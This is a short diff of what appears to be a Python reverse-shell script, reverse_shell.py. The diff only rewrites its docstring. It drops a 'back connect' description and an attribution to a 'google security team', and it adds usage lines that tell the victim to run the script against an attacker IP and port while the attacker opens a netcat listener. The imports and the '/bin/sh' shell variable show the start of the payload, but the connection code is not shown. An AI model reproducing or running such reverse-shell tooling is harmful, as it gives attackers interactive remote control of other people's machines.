@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 # encoding:utf8
 """
-back connect py version,only linux have pty module
-code by google security team
+    client: python reverse_shell.py attack-ip port
+    attack: nc -l -v -p port
 """
 import sys,os,socket,pty
 shell = "/bin/sh"
